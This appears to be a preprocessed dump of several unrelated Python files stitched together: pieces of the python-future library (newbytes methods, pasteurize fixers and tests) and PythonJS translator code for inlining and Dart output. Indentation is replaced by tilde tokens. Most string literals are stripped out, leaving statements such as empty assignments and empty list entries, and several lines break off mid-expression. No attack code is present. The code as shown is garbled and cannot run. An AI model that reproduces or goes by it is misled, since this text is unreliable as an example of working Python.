#     mybytes = [] \n 
#     for code in self: \n 
#         # Code is an int \n 
#         if 0x80 <= code <= 0xFF: \n 
#             b = 0xDC00 + code \n 
#         elif code <= 0x7F: \n 
#             b = _unichr(c).decode(encoding=encoding) \n 
#         else: \n 
#             # # It may be a bad byte \n 
#             # FIXME: What to do in this case? See the Py3 docs / tests. \n 
#             # # Try swallowing it. \n 
#             # continue \n 
#             # print("RAISE!") \n 
#             raise NotASurrogateError \n 
#         mybytes.append(b) \n 
#     return newbytes(mybytes) \n 
# return newbytes(super(newstr, self).decode(encoding, errors)) \n 
\n 
~~ @ no ( unicode ) \n 
def startswith ( self , prefix , * args ) : \n 
~~~ return super ( newbytes , self ) . startswith ( prefix , * args ) \n 
\n 
~~ @ no ( unicode ) \n 
def endswith ( self , prefix , * args ) : \n 
~~~ return super ( newbytes , self ) . endswith ( prefix , * args ) \n 
\n 
~~ @ no ( unicode ) \n 
def split ( self , sep = None , maxsplit = - 1 ) : \n 
# Py2 str.split() takes maxsplit as an optional parameter, not as a \n 
# keyword argument as in Python 3 bytes. \n 
~~~ parts = super ( newbytes , self ) . split ( sep , maxsplit ) \n 
return [ newbytes ( part ) for part in parts ] \n 
\n 
~~ def splitlines ( self , keepends = False ) : \n 
~~~ """\n        B.splitlines([keepends]) -> list of lines\n\n        Return a list of the lines in B, breaking at line boundaries.\n        Line breaks are not included in the resulting list unless keepends\n        is given and true.\n        """ \n 
# Py2 str.splitlines() takes keepends as an optional parameter, \n 
# not as a keyword argument as in Python 3 bytes. \n 
parts = super ( newbytes , self ) . splitlines ( keepends ) \n 
return [ newbytes ( part ) for part in parts ] \n 
\n 
~~ @ no ( unicode ) \n 
def rsplit ( self , sep = None , maxsplit = - 1 ) : \n 
# Py2 str.rsplit() takes maxsplit as an optional parameter, not as a \n 
# keyword argument as in Python 3 bytes. \n 
~~~ parts = super ( newbytes , self ) . rsplit ( sep , maxsplit ) \n 
return [ newbytes ( part ) for part in parts ] \n 
\n 
~~ @ no ( unicode ) \n 
def partition ( self , sep ) : \n 
~~~ parts = super ( newbytes , self ) . partition ( sep ) \n 
return tuple ( newbytes ( part ) for part in parts ) \n 
\n 
~~ @ no ( unicode ) \n 
def rpartition ( self , sep ) : \n 
~~~ parts = super ( newbytes , self ) . rpartition ( sep ) \n 
return tuple ( newbytes ( part ) for part in parts ) \n 
\n 
~~ @ no ( unicode , ( 1 , ) ) \n 
def rindex ( self , sub , * args ) : \n 
~~~ \n 
pos = self . rfind ( sub , * args ) \n 
if pos == - 1 : \n 
~~~ raise ValueError ( ) \n 
\n 
~~ ~~ @ no ( unicode ) \n 
def index ( self , sub , * args ) : \n 
~~~ \n 
if isinstance ( sub , int ) : \n 
~~~ if len ( args ) == 0 : \n 
~~~ start , end = 0 , len ( self ) \n 
~~ elif len ( args ) == 1 : \n 
~~~ start = args [ 0 ] \n 
~~ elif len ( args ) == 2 : \n 
~~~ start , end = args \n 
~~ else : \n 
~~~ raise TypeError ( ) \n 
~~ return list ( self ) [ start : end ] . index ( sub ) \n 
~~ if not isinstance ( sub , bytes ) : \n 
~~~ try : \n 
~~~ sub = self . __class__ ( sub ) \n 
~~ except ( TypeError , ValueError ) : \n 
~~~ raise TypeError ( "can\'t convert sub to bytes" ) \n 
~~ ~~ try : \n 
~~~ return super ( newbytes , self ) . index ( sub , * args ) \n 
~~ except ValueError : \n 
~~~ raise ValueError ( ) \n 
\n 
~~ ~~ def __eq__ ( self , other ) : \n 
~~~ if isinstance ( other , ( _builtin_bytes , bytearray ) ) : \n 
~~~ return super ( newbytes , self ) . __eq__ ( other ) \n 
~~ else : \n 
~~~ return False \n 
\n 
~~ ~~ def __ne__ ( self , other ) : \n 
~~~ if isinstance ( other , _builtin_bytes ) : \n 
~~~ return super ( newbytes , self ) . __ne__ ( other ) \n 
~~ else : \n 
~~~ return True \n 
\n 
~~ ~~ unorderable_err = \n 
\n 
def __lt__ ( self , other ) : \n 
~~~ if not isbytes ( other ) : \n 
~~~ raise TypeError ( self . unorderable_err . format ( type ( other ) ) ) \n 
~~ return super ( newbytes , self ) . __lt__ ( other ) \n 
\n 
~~ def __le__ ( self , other ) : \n 
~~~ if not isbytes ( other ) : \n 
~~~ raise TypeError ( self . unorderable_err . format ( type ( other ) ) ) \n 
~~ return super ( newbytes , self ) . __le__ ( other ) \n 
\n 
~~ def __gt__ ( self , other ) : \n 
~~~ if not isbytes ( other ) : \n 
~~~ raise TypeError ( self . unorderable_err . format ( type ( other ) ) ) \n 
~~ return super ( newbytes , self ) . __gt__ ( other ) \n 
\n 
~~ def __ge__ ( self , other ) : \n 
~~~ if not isbytes ( other ) : \n 
~~~ raise TypeError ( self . unorderable_err . format ( type ( other ) ) ) \n 
~~ return super ( newbytes , self ) . __ge__ ( other ) \n 
\n 
~~ def __native__ ( self ) : \n 
\n 
# newbytes.__str__() returns e.g. "b\'blah\'", consistent with Py3 bytes. \n 
~~~ return super ( newbytes , self ) . __str__ ( ) \n 
\n 
~~ def __getattribute__ ( self , name ) : \n 
~~~ """\n        A trick to cause the ``hasattr`` builtin-fn to return False for\n        the \'encode\' method on Py2.\n        """ \n 
if name in [ , ] : \n 
~~~ raise AttributeError ( "encode method has been disabled in newbytes" ) \n 
~~ return super ( newbytes , self ) . __getattribute__ ( name ) \n 
\n 
~~ @ no ( unicode ) \n 
def rstrip ( self , bytes_to_strip = None ) : \n 
~~~ """\n        Strip trailing bytes contained in the argument.\n        If the argument is omitted, strip trailing ASCII whitespace.\n        """ \n 
return newbytes ( super ( newbytes , self ) . rstrip ( bytes_to_strip ) ) \n 
\n 
~~ @ no ( unicode ) \n 
def strip ( self , bytes_to_strip = None ) : \n 
~~~ """\n        Strip leading and trailing bytes contained in the argument.\n        If the argument is omitted, strip trailing ASCII whitespace.\n        """ \n 
return newbytes ( super ( newbytes , self ) . strip ( bytes_to_strip ) ) \n 
\n 
~~ def lower ( self ) : \n 
~~~ """\n        b.lower() -> copy of b\n        \n        Return a copy of b with all ASCII characters converted to lowercase.\n        """ \n 
return newbytes ( super ( newbytes , self ) . lower ( ) ) \n 
\n 
~~ @ no ( unicode ) \n 
def upper ( self ) : \n 
~~~ """\n        b.upper() -> copy of b\n        \n        Return a copy of b with all ASCII characters converted to uppercase.\n        """ \n 
return newbytes ( super ( newbytes , self ) . upper ( ) ) \n 
\n 
~~ @ classmethod \n 
@ no ( unicode ) \n 
def maketrans ( cls , frm , to ) : \n 
~~~ """\n        B.maketrans(frm, to) -> translation table\n\n        Return a translation table (a bytes object of length 256) suitable\n        for use in the bytes or bytearray translate method where each byte\n        in frm is mapped to the byte at the same position in to.\n        The bytes objects frm and to must be of the same length.\n        """ \n 
return newbytes ( string . maketrans ( frm , to ) ) \n 
\n 
\n 
~~ ~~ __all__ = [ ] \n 
"""\nUNFINISHED\nFor the ``future`` package.\n\nAdds this import line:\n\n    from __future__ import division\n\nat the top so the code runs identically on Py3 and Py2.6/2.7\n""" \n 
\n 
from libpasteurize . fixes . fix_division import FixDivision \n 
\n 
"""\nAdds this import line:\n\n    from builtins import XYZ\n\nfor each of the functions XYZ that is used in the module.\n""" \n 
\n 
from __future__ import unicode_literals \n 
\n 
from lib2to3 import fixer_base \n 
from lib2to3 . pygram import python_symbols as syms \n 
from lib2to3 . fixer_util import Name , Call , in_special_context \n 
\n 
from libfuturize . fixer_util import touch_import_top \n 
\n 
# All builtins are: \n 
#     from future.builtins.iterators import (filter, map, zip) \n 
#     from future.builtins.misc import (ascii, chr, hex, input, isinstance, oct, open, round, super) #     from future.types import (bytes, dict, int, range, str) \n 
\n 
\n 
replaced_builtins = . split ( ) \n 
\n 
expression = . join ( [ "name=\'{0}\'" . format ( name ) for name in replaced_builtins ] ) \n 
\n 
\n 
class FixFutureBuiltins ( fixer_base . BaseFix ) : \n 
~~~ BM_compatible = True \n 
run_order = 9 \n 
\n 
\n 
#     if isinstance(s, str): \n 
#         ... \n 
PATTERN = """\n              power<\n                 ({0}) trailer< \'(\' args=[any] \')\' >\n              rest=any* >\n              """ . format ( expression ) \n 
\n 
def transform ( self , node , results ) : \n 
~~~ name = results [ "name" ] \n 
touch_import_top ( , name . value , node ) \n 
# name.replace(Name(u"input", prefix=name.prefix)) \n 
\n 
~~ ~~ from __future__ import absolute_import \n 
import sys \n 
\n 
if sys . version_info [ 0 ] < 3 : \n 
~~~ from Tkinter import * \n 
~~ else : \n 
~~~ raise ImportError ( \n 
\n 
) \n 
# -*- coding: utf-8 -*- \n 
~~ """\nThis module contains snippets of Python 3 code (invalid Python 2) and\ntests for whether they can be passed to ``pasteurize`` and\nimmediately run under both Python 2 and Python 3.\n""" \n 
\n 
from __future__ import print_function , absolute_import \n 
\n 
import pprint \n 
from subprocess import Popen , PIPE \n 
import tempfile \n 
import os \n 
\n 
from future . tests . base import CodeHandler , unittest , skip26 \n 
\n 
\n 
class TestPasteurize ( CodeHandler ) : \n 
~~~ """\n    After running ``pasteurize``, these Python 3 code snippets should run\n    on both Py3 and Py2.\n    """ \n 
\n 
def setUp ( self ) : \n 
# For tests that need a text file: \n 
~~~ _ , self . textfilename = tempfile . mkstemp ( text = True ) \n 
super ( TestPasteurize , self ) . setUp ( ) \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ os . unlink ( self . textfilename ) \n 
\n 
~~ @ skip26 # Python 2.6\'s lib2to3 causes the "from builtins import \n 
# range" line to be stuck at the bottom of the module! \n 
def test_range_slice ( self ) : \n 
~~~ """\n        After running ``pasteurize``, this Python 3 code should run\n        quickly on both Py3 and Py2 without a MemoryError\n        """ \n 
code = \n 
self . unchanged ( code , from3 = True ) \n 
\n 
~~ def test_print ( self ) : \n 
~~~ """\n        This Python 3-only code is a SyntaxError on Py2 without the\n        print_function import from __future__.\n        """ \n 
code = \n 
self . unchanged ( code , from3 = True ) \n 
\n 
~~ def test_division ( self ) : \n 
~~~ """\n        True division should not be screwed up by conversion from 3 to both\n        """ \n 
code = \n 
self . unchanged ( code , from3 = True ) \n 
\n 
# TODO: write / fix the raise_ fixer so that it uses the raise_ function \n 
~~ @ unittest . expectedFailure \n 
def test_exception_indentation ( self ) : \n 
~~~ """\n        As of v0.11.2, pasteurize broke the indentation of ``raise`` statements\n        using with_traceback. Test for this.\n        """ \n 
before = \'\'\'\n        import sys\n        if True:\n            try:\n                \'string\' + 1\n            except TypeError:\n                ty, va, tb = sys.exc_info()\n                raise TypeError("can\'t do that!").with_traceback(tb)\n        \'\'\' \n 
after = \'\'\'\n        import sys\n        from future.utils import raise_with_traceback\n        if True:\n            try:\n                \'string\' + 1\n            except TypeError:\n                ty, va, tb = sys.exc_info()\n                raise_with_traceback(TypeError("can\'t do that!"), tb)\n        \'\'\' \n 
self . convert_check ( before , after , from3 = True ) \n 
\n 
# TODO: fix and test this test \n 
~~ @ unittest . expectedFailure \n 
def test_urllib_request ( self ) : \n 
~~~ """\n        Example Python 3 code using the new urllib.request module.\n        \n        Does the ``pasteurize`` script handle this?\n        """ \n 
before = """\n            import pprint\n            import urllib.request\n\n            URL = \'http://pypi.python.org/pypi/{}/json\'\n            package = \'future\'\n            \n            r = urllib.request.urlopen(URL.format(package))\n            pprint.pprint(r.read())\n        """ \n 
after = """\n            import pprint\n            import future.standard_library.urllib.request as urllib_request\n\n            URL = \'http://pypi.python.org/pypi/{}/json\'\n            package = \'future\'\n            \n            r = urllib_request.urlopen(URL.format(package))\n            pprint.pprint(r.read())\n        """ \n 
\n 
self . convert_check ( before , after , from3 = True ) \n 
\n 
~~ def test_urllib_refactor2 ( self ) : \n 
~~~ before = """\n        import urllib.request, urllib.parse\n\n        f = urllib.request.urlopen(url, timeout=15)\n        filename = urllib.parse.urlparse(url)[2].split(\'/\')[-1]\n        """ \n 
\n 
after = """\n        from future.standard_library.urllib import request as urllib_request\n        from future.standard_library.urllib import parse as urllib_parse\n\n        f = urllib_request.urlopen(url, timeout=15)\n        filename = urllib_parse.urlparse(url)[2].split(\'/\')[-1]\n        """ \n 
\n 
~~ def test_correct_exit_status ( self ) : \n 
~~~ """\n        Issue #119: futurize and pasteurize were not exiting with the correct\n        status code. This is because the status code returned from\n        libfuturize.main.main() etc. was a ``newint``, which sys.exit() always\n        translates into 1!\n        """ \n 
from libpasteurize . main import main \n 
# Try pasteurizing this test script: \n 
retcode = main ( [ self . textfilename ] ) \n 
self . assertTrue ( isinstance ( retcode , int ) ) # i.e. Py2 builtin int \n 
\n 
\n 
~~ ~~ class TestFuturizeAnnotations ( CodeHandler ) : \n 
~~~ @ unittest . expectedFailure \n 
def test_return_annotations_alone ( self ) : \n 
~~~ before = "def foo() -> \'bar\': pass" \n 
after = """\n        def foo(): pass\n        foo.__annotations__ = {\'return\': \'bar\'}\n        """ \n 
self . convert_check ( before , after , from3 = True ) \n 
\n 
b = """\n        def foo() -> "bar":\n            print "baz"\n            print "what\'s next, again?"\n        """ \n 
a = """\n        def foo():\n            print "baz"\n            print "what\'s next, again?"\n        """ \n 
self . convert_check ( b , a , from3 = True ) \n 
\n 
~~ @ unittest . expectedFailure \n 
def test_single_param_annotations ( self ) : \n 
~~~ b = "def foo(bar:\'baz\'): pass" \n 
a = """\n        def foo(bar): pass\n        foo.__annotations__ = {\'bar\': \'baz\'}\n        """ \n 
self . convert_check ( b , a , from3 = True ) \n 
\n 
b = """\n        def foo(bar:"baz"="spam"):\n            print("what\'s next, again?")\n            print("whatever.")\n        """ \n 
a = """\n        def foo(bar="spam"):\n            print("what\'s next, again?")\n            print("whatever.")\n        foo.__annotations__ = {\'bar\': \'baz\'}\n        """ \n 
self . convert_check ( b , a , from3 = True ) \n 
\n 
~~ def test_multiple_param_annotations ( self ) : \n 
~~~ b = "def foo(bar:\'spam\'=False, baz:\'eggs\'=True, ham:False=\'spaghetti\'): pass" \n 
a = "def foo(bar=False, baz=True, ham=\'spaghetti\'): pass" \n 
self . convert_check ( b , a , from3 = True ) \n 
\n 
b = """\n        def foo(bar:"spam"=False, baz:"eggs"=True, ham:False="spam"):\n            print("this is filler, just doing a suite")\n            print("suites require multiple lines.")\n        """ \n 
a = """\n        def foo(bar=False, baz=True, ham="spam"):\n            print("this is filler, just doing a suite")\n            print("suites require multiple lines.")\n        """ \n 
self . convert_check ( b , a , from3 = True ) \n 
\n 
~~ def test_mixed_annotations ( self ) : \n 
~~~ b = "def foo(bar=False, baz:\'eggs\'=True, ham:False=\'spaghetti\') -> \'zombies\': pass" \n 
a = "def foo(bar=False, baz=True, ham=\'spaghetti\'): pass" \n 
self . convert_check ( b , a , from3 = True ) \n 
\n 
b = """\n        def foo(bar:"spam"=False, baz=True, ham:False="spam") -> \'air\':\n            print("this is filler, just doing a suite")\n            print("suites require multiple lines.")\n        """ \n 
a = """\n        def foo(bar=False, baz=True, ham="spam"):\n            print("this is filler, just doing a suite")\n            print("suites require multiple lines.")\n        """ \n 
self . convert_check ( b , a , from3 = True ) \n 
\n 
b = "def foo(bar) -> \'brains\': pass" \n 
a = "def foo(bar): pass" \n 
self . convert_check ( b , a , from3 = True ) \n 
\n 
~~ def test_functions_unchanged ( self ) : \n 
~~~ s = "def foo(): pass" \n 
self . unchanged ( s , from3 = True ) \n 
\n 
s = """\n        def foo():\n            pass\n            pass\n        """ \n 
self . unchanged ( s , from3 = True ) \n 
\n 
s = """\n        def foo(bar=\'baz\'):\n            pass\n            pass\n        """ \n 
self . unchanged ( s , from3 = True ) \n 
\n 
\n 
~~ ~~ if __name__ == : \n 
~~~ unittest . main ( ) \n 
# AST Function Inliner \n 
# by Brett Hartshorn - copyright 2013 \n 
# License: "New BSD" \n 
~~ import ast , copy \n 
from ast_utils import * \n 
\n 
class Inliner : \n 
~~~ def setup_inliner ( self , writer ) : \n 
~~~ self . writer = writer \n 
self . _with_inline = False \n 
self . _inline = [ ] \n 
self . _inline_ids = 0 \n 
self . _inline_breakout = False \n 
\n 
~~ def inline_helper_remap_names ( self , remap ) : \n 
~~~ return "JS(\'var %s\')" % . join ( remap . values ( ) ) \n 
\n 
~~ def inline_helper_return_id ( self , return_id ) : \n 
~~~ return "JS(\'var __returns__%s = null\')" % return_id \n 
\n 
~~ def inline_function ( self , node ) : \n 
~~~ name = self . visit ( node . func ) \n 
fnode = self . _global_functions [ name ] \n 
fnode = copy . deepcopy ( fnode ) \n 
finfo = inspect_function ( fnode ) \n 
remap = { } \n 
for n in finfo [ ] : \n 
~~~ if n . id not in finfo [ ] : continue \n 
\n 
if isinstance ( n . id , ast . Name ) : \n 
~~~ raise RuntimeError \n 
\n 
~~ if n . id not in remap : \n 
~~~ new_name = n . id + % self . _inline_ids \n 
remap [ n . id ] = new_name \n 
self . _inline_ids += 1 \n 
\n 
~~ n . id = remap [ n . id ] \n 
\n 
~~ if remap : \n 
~~~ self . writer . write ( self . inline_helper_remap_names ( remap ) ) \n 
for n in remap : \n 
~~~ if n in finfo [ ] : \n 
~~~ self . _func_typedefs [ remap [ n ] ] = finfo [ ] [ n ] \n 
\n 
~~ ~~ ~~ offset = len ( fnode . args . args ) - len ( fnode . args . defaults ) \n 
for i , ad in enumerate ( fnode . args . args ) : \n 
~~~ if i < len ( node . args ) : \n 
~~~ ac = self . visit ( node . args [ i ] ) \n 
~~ else : \n 
~~~ assert fnode . args . defaults \n 
dindex = i - offset \n 
ac = self . visit ( fnode . args . defaults [ dindex ] ) \n 
\n 
~~ ad = remap [ self . visit ( ad ) ] \n 
self . writer . write ( "%s = %s" % ( ad , ac ) ) \n 
\n 
\n 
~~ return_id = name + str ( self . _inline_ids ) \n 
self . _inline . append ( return_id ) \n 
\n 
self . writer . write ( self . inline_helper_return_id ( return_id ) ) \n 
\n 
if True : \n 
~~~ self . _inline_breakout = True \n 
self . writer . write ( ) \n 
self . writer . push ( ) \n 
for b in fnode . body : \n 
~~~ self . visit ( b ) \n 
\n 
~~ if not len ( finfo [ ] ) : \n 
~~~ self . writer . write ( ) \n 
~~ self . writer . pull ( ) \n 
#self._inline_breakout = False \n 
~~ else : \n 
~~~ for b in fnode . body : \n 
~~~ self . visit ( b ) \n 
\n 
~~ ~~ if self . _inline . pop ( ) != return_id : \n 
~~~ raise RuntimeError \n 
\n 
~~ for n in remap : \n 
~~~ gname = remap [ n ] \n 
for n in finfo [ ] : \n 
~~~ if n . id == gname : \n 
~~~ n . id = n \n 
\n 
~~ ~~ ~~ return % return_id \n 
#!/usr/bin/env python \n 
# PythonJS to Dart Translator \n 
# by Brett Hartshorn - copyright 2013 \n 
# License: "New BSD" \n 
~~ ~~ import sys \n 
import ast \n 
import pythonjs \n 
\n 
\n 
class TransformSuperCalls ( ast . NodeVisitor ) : \n 
~~~ def __init__ ( self , node , class_names ) : \n 
~~~ self . _class_names = class_names \n 
self . visit ( node ) \n 
\n 
~~ def visit_Call ( self , node ) : \n 
~~~ if isinstance ( node . func , ast . Attribute ) and isinstance ( node . func . value , ast . Name ) and node . func . value ~~~ node . func . attr = + node . func . attr \n 
\n 
~~ ~~ ~~ class CollectNames ( ast . NodeVisitor ) : \n 
~~~ def __init__ ( self ) : \n 
~~~ self . _names = [ ] \n 
~~ def visit_Name ( self , node ) : \n 
~~~ self . _names . append ( node ) \n 
\n 
~~ ~~ def collect_names ( node ) : \n 
~~~ a = CollectNames ( ) \n 
a . visit ( node ) \n 
return a . _names \n 
\n 
\n 
~~ class DartGenerator ( pythonjs . JSGenerator ) : \n 
\n 
~~~ def __init__ ( self , requirejs = False , insert_runtime = False ) : \n 
~~~ pythonjs . JSGenerator . __init__ ( self , requirejs = False , insert_runtime = False ) \n 
self . _classes = dict ( ) \n 
self . _class_props = dict ( ) \n 
self . _raw_dict = False \n 
\n 
~~ def visit_With ( self , node ) : \n 
~~~ s = [ ] \n 
for b in node . body : \n 
~~~ a = self . visit ( b ) \n 
a = a . replace ( , ) \n 
a = a . strip ( ) [ 1 : - 2 ] # strip `"x";` to `x` \n 
s . append ( a ) \n 
~~ return . join ( s ) \n 
\n 
~~ def _visit_subscript_ellipsis ( self , node ) : \n 
~~~ name = self . visit ( node . value ) \n 
return % name \n 
\n 
~~ def visit_List ( self , node ) : \n 
~~~ return % . join ( map ( self . visit , node . elts ) ) \n 
\n 
~~ def visit_Dict ( self , node ) : \n 
~~~ a = [ ] \n 
for i in range ( len ( node . keys ) ) : \n 
~~~ k = self . visit ( node . keys [ i ] ) \n 
v = self . visit ( node . values [ i ] ) \n 
a . append ( % ( k , v ) ) \n 
~~ b = . join ( a ) \n 
if self . _raw_dict : \n 
~~~ return % b \n 
~~ else : \n 
~~~ return % b \n 
\n 
~~ ~~ def visit_ClassDef ( self , node ) : \n 
~~~ node . _parents = set ( ) \n 
out = [ ] \n 
extends = False ## Dart has no support for multiple inheritance! \n 
props = set ( [ ] ) \n 
bases = set ( ) \n 
base_classes = set ( ) \n 
\n 
self . _classes [ node . name ] = node \n 
self . _class_props [ node . name ] = props \n 
for decor in node . decorator_list : ## class decorators \n 
~~~ if isinstance ( decor , ast . Call ) : \n 
~~~ props . update ( [ self . visit ( a ) for a in decor . args ] ) \n 
~~ elif isinstance ( decor , ast . Attribute ) and isinstance ( decor . value , ast . Name ) and decor . value . id == ~~~ if decor . attr == : \n 
~~~ extends = True \n 
props . add ( ) \n 
for name_node in collect_names ( node ) : \n 
~~~ if name_node . id == : \n 
~~~ name_node . id = \n 
~~ ~~ ~~ ~~ else : \n 
~~~ raise SyntaxError \n 
\n 
\n 
~~ ~~ for base in node . bases : \n 
~~~ n = self . visit ( base ) \n 
if n == : \n 
~~~ continue \n 
~~ node . _parents . add ( n ) \n 
\n 
bases . add ( n ) \n 
if n in self . _class_props : \n 
~~~ props . update ( self . _class_props [ n ] ) \n 
base_classes . add ( self . _classes [ n ] ) \n 
~~ else : ## special case - subclassing a builtin like `list` \n 
~~~ continue \n 
\n 
~~ for p in self . _classes [ n ] . _parents : \n 
~~~ bases . add ( p ) \n 
props . update ( self . _class_props [ p ] ) \n 
base_classes . add ( self . _classes [ p ] ) \n 
\n 
~~ ~~ if bases : \n 
~~~ if extends : \n 
~~~ assert len ( bases ) == 1 \n 
out . append ( % ( node . name , . join ( bases ) ) ) \n 
~~ else : \n 
\n 
\n 
#else: \n 
~~~ out . append ( % ( node . name , . join ( bases ) ) ) \n 
\n 
\n 
~~ ~~ else : \n 
~~~ out . append ( % node . name ) \n 
~~ self . push ( ) \n 
\n 
for p in props : \n 
~~~ out . append ( self . indent ( ) + % p ) \n 
\n 
~~ method_names = set ( ) \n 
for b in node . body : \n 
\n 
~~~ if isinstance ( b , ast . With ) : \n 
~~~ out . append ( self . visit ( b ) ) \n 
~~ elif isinstance ( b , ast . FunctionDef ) and len ( b . decorator_list ) : ##getter/setters \n 
~~~ for name_node in collect_names ( b ) : \n 
~~~ if name_node . id == : \n 
~~~ name_node . id = \n 
\n 
~~ ~~ b . args . args = b . args . args [ 1 : ] \n 
out . append ( self . visit ( b ) ) \n 
\n 
~~ elif extends : \n 
~~~ if isinstance ( b , ast . FunctionDef ) : \n 
~~~ b . args . args = b . args . args [ 1 : ] \n 
if b . name == node . name : \n 
~~~ args = [ self . visit ( a ) for a in b . args . args ] \n 
args = . join ( args ) \n 
out . append ( \n 
self . indent ( ) + % ( node . name , args , args ) \n 
) \n 
b . name = \n 
~~ elif b . name == : \n 
~~~ b . name = \n 
b . _prefix = \n 
~~ elif b . name == : \n 
~~~ b . name = \n 
b . _prefix = \n 
~~ elif b . name == : \n 
~~~ b . name = \n 
b . _prefix = \n 
~~ elif b . name == : \n 
~~~ b . name = \n 
b . _prefix = \n 
~~ elif b . name == : \n 
~~~ b . name = \n 
b . _prefix = \n 
~~ elif b . name == : \n 
~~~ b . name = \n 
b . _prefix = \n 
~~ elif b . name == : \n 
~~~ b . name = \n 
b . _prefix = \n 
\n 
~~ elif b . name == : \n 
~~~ b . name = \n 
b . _prefix = \n 
~~ elif b . name == : \n 
~~~ b . name = \n 
b . _prefix = \n 
\n 
\n 
\n 
~~ ~~ line = self . visit ( b ) \n 
out . append ( line ) \n 
\n 
~~ elif isinstance ( b , ast . FunctionDef ) and b . name == node . name : \n 
~~~ args , kwargs = self . get_args_kwargs_from_funcdef ( b , skip_self = True ) \n 
kwargs_init = [ % ( x . split ( ) [ 0 ] , x . split ( ) [ 0 ] ) for x in kwargs ] \n 
\n 
#args = [self.visit(a) for a in b.args.args][1:] \n 
\n 
b . _prefix = \n 
b . name = \n 
out . append ( self . visit ( b ) ) \n 
if args : \n 
~~~ args = . join ( args ) \n 
if kwargs : \n 
~~~ out . append ( \n 
self . indent ( ) + % ( node . name , args , . join ( kwargs ) , node ) \n 
\n 
~~ else : \n 
~~~ out . append ( \n 
self . indent ( ) + % ( node . name , args , node . name , args ) \n 
) \n 
~~ ~~ elif kwargs : \n 
~~~ out . append ( \n 
self . indent ( ) + % ( node . name , . join ( kwargs ) , node . name , ) \n 
\n 
~~ else : \n 
~~~ out . append ( \n 
self . indent ( ) + % ( node . name , node . name ) \n 
) \n 
\n 
~~ ~~ elif isinstance ( b , ast . FunctionDef ) : \n 
~~~ method_names . add ( b . name ) \n 
TransformSuperCalls ( b , bases ) \n 
\n 
operator = False \n 
if b . name == : \n 
~~~ operator = \n 
~~ elif b . name == : \n 
~~~ operator = \n 
~~ elif b . name == : \n 
~~~ operator = \n 
~~ elif b . name == : \n 
~~~ operator = \n 
~~ elif b . name == : \n 
~~~ operator = \n 
~~ elif b . name == : \n 
~~~ operator = \n 
~~ elif b . name == : \n 
~~~ operator = \n 
~~ elif b . name == : \n 
~~~ operator = \n 
~~ elif b . name == : \n 
~~~ operator = \n 
~~ elif b . name == : \n 
~~~ operator = \n 
~~ elif b . name == : \n 
~~~ operator = \n 
\n 
~~ args = [ self . visit ( a ) for a in b . args . args ] [ 1 : ] \n 
args = . join ( args ) \n 
if operator and args : \n 
~~~ out . append ( self . indent ( ) + % ( operator , args , node . name , b . name \n 
~~ elif operator : \n 
~~~ out . append ( self . indent ( ) + % ( operator , node . name , b . name ) ) \n 
\n 
~~ elif args : \n 
~~~ out . append ( self . indent ( ) + % ( b . name , args , node . name , b . name ~~ else : \n 
~~~ out . append ( self . indent ( ) + % ( b . name , node . name , b . name ) ) \n 
\n 
~~ b . _prefix = \n 
name = b . name \n 
b . name = % name \n 
out . append ( self . visit ( b ) ) \n 
b . name = name \n 
\n 
~~ else : \n 
~~~ line = self . visit ( b ) \n 
if line . startswith ( ) : \n 
~~~ out . append ( self . indent ( ) + line ) \n 
~~ else : \n 
~~~ out . append ( line ) \n 
\n 
~~ ~~ ~~ if not extends and base_classes : \n 
~~~ for bnode in base_classes : \n 
~~~ for b in bnode . body : \n 
~~~ if isinstance ( b , ast . FunctionDef ) : \n 
~~~ if b . name == : continue \n 
if b . name in method_names : continue \n 
\n 
args = [ self . visit ( a ) for a in b . args . args ] [ 1 : ] \n 
args = . join ( args ) \n 
if args : \n 
~~~ out . append ( self . indent ( ) + % ( b . name , args , bnode . name , b . ~~ else : \n 
~~~ out . append ( self . indent ( ) + % ( b . name , bnode . name , b . name ) ) \n 
\n 
\n 
~~ ~~ ~~ ~~ ~~ self . pull ( ) \n 
out . append ( ) \n 
return . join ( out ) \n 
\n 
~~ def get_args_kwargs_from_funcdef ( self , node , skip_self = False ) : \n 
~~~ args = [ ] \n 
kwargs = [ ] \n 
if skip_self : nargs = node . args . args [ 1 : ] \n 
else : nargs = node . args . args \n 
\n 
offset = len ( nargs ) - len ( node . args . defaults ) \n 
for i , arg in enumerate ( nargs ) : \n 
~~~ a = arg . id \n 
dindex = i - offset \n 
if dindex >= 0 and node . args . defaults : \n 
~~~ default_value = self . visit ( node . args . defaults [ dindex ] ) \n 
kwargs . append ( % ( a , default_value ) ) \n 
~~ else : \n 
~~~ args . append ( a ) \n 
\n 
~~ ~~ return args , kwargs \n 
\n 
\n 
~~ def _visit_for_prep_iter_helper ( self , node , out , iter_name ) : \n 
~~~ out . append ( \n 
\n 
self . indent ( ) + % ( iter_name , iter_name , iter_name ) \n 
) \n 
\n 
\n 
~~ def visit_Expr ( self , node ) : \n 
~~~ s = self . visit ( node . value ) \n 
if isinstance ( node . value , ast . Call ) and isinstance ( node . value . func , ast . Name ) and node . value . func . ~~~ if s . endswith ( ) and in s . split ( ) : \n 
~~~ pass \n 
~~ elif not s . endswith ( ) : \n 
~~~ s += \n 
~~ ~~ elif not s . endswith ( ) : \n 
~~~ s += \n 
~~ return s \n 
\n 
\n 
\n 
~~ def visit_Print ( self , node ) : \n 
~~~ args = [ self . visit ( e ) for e in node . values ] \n 
if len ( args ) > 1 : \n 
~~~ s = % . join ( args ) \n 
~~ else : \n 
~~~ s = % . join ( args ) \n 
~~ return s \n 
\n 
\n 
~~ def visit_Assign ( self , node ) : \n 
~~~ assert len ( node . targets ) == 1 \n 
target = node . targets [ 0 ] \n 
if isinstance ( target , ast . Tuple ) : \n 
#raise NotImplementedError \n 
~~~ elts = [ self . visit ( e ) for e in target . elts ] \n 
if self . indent ( ) : \n 
~~~ return % ( . join ( elts ) , self . visit ( node . value ) ) \n 
~~ else : \n 
~~~ return % ( . join ( elts ) , self . visit ( node . value ) ) \n 
\n 
~~ ~~ else : \n 
~~~ target = self . visit ( target ) \n 
value = self . visit ( node . value ) \n 
if self . indent ( ) : \n 
~~~ code = % ( target , value ) \n 
~~ else : \n 
~~~ code = % ( target , value ) \n 
~~ return code \n 
\n 
~~ ~~ def _visit_function ( self , node ) : \n 
~~~ getter = False \n 
setter = False \n 
args_typedefs = { } \n 
for decor in node . decorator_list : \n 
~~~ if isinstance ( decor , ast . Name ) and decor . id == : \n 
~~~ getter = True \n 
~~ elif isinstance ( decor , ast . Attribute ) and isinstance ( decor . value , ast . Name ) and decor . attr == ~~~ setter = True \n 
